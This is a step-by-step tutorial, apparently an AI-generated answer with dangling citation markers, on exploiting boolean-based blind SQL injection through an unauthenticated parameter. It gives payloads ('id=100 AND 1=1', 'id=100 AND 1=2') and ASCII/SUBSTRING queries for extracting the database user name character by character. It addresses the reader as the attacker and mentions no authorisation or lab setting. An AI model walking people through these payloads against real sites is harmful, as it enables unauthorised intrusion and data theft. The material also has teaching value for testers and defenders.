## Step-by-Step Execution Workflow
To manually find and exploit a flaw outside a user account using Boolean algebra, follow these structured steps:
## Step 1: Establish the Baseline Response ($A$)
Locate an unauthenticated input parameter that interacts with a backend database or interpreter (for example, a public product ID or game section endpoint).

* Test Request: https://target.com
* Observation: The server responds with an HTTP status code of 200 OK and a page size of exactly 4,500 bytes. This state represents your logical True Baseline ($A$).

## Step 2: Inject a Tautology ($P = \text{True}$) [9, 10] 
Modify the input parameter by appending a statement that is mathematically always true using the logical AND operator ($1 = 1$). [11] 

* Payload Request: id=100 AND 1=1
* Mathematical Evaluation:
$$\text{Response} = A \land (1 = 1) \implies A \land \text{True} \implies A$$ 
* Observation: The server returns the exact same 4,500 bytes response. This confirms the backend server injected your math directly into its logical interpreter instead of treating it as plain text. [12] 

## Step 3: Inject a Contradiction ($P = \text{False}$) [13, 14, 15] 
Modify the input parameter by appending a statement that is mathematically always false ($1 = 2$). [16] 

* Payload Request: id=100 AND 1=2
* Mathematical Evaluation:
$$\text{Response} = A \land (1 = 2) \implies A \land \text{False} \implies \text{False}$$ 
* Observation: The server logic breaks. It returns an HTTP status code of 200 OK but the page size drops to 312 bytes (an empty list or generic error text). Because the server output changed drastically between Step 2 and Step 3, you have mathematically proven that the endpoint is vulnerable to Boolean-based Injection. [17] 

## Step 4: Extract Data Byte-by-Byte (Bitwise Guessing)
Now that you control the server's logical flow, you can use binary comparison queries to ask the server yes-or-no mathematical questions about its internal data.
To find out what operating system or database user the server is running under without seeing the text, test individual characters using their ASCII numeric values: [18] 

* Question 1: Is the first character of the database user name greater than ASCII value 100?
* Payload: id=100 AND (ASCII(SUBSTRING(USER(),1,1)) > 100)
   * Result: Server returns 4,500 bytes ($True$). The character value is higher than 100.
* Question 2: Is the first character greater than ASCII value 110?
* Payload: id=100 AND (ASCII(SUBSTRING(USER(),1,1)) > 110)
   * Result: Server returns 312 bytes ($False$). The character value is not higher than 110. [19] 

By narrowing down the numbers mathematically using a binary search pattern, you can pinpoint the exact ASCII code, translating the server's logical true/false behavior back into plain text strings. [20] 
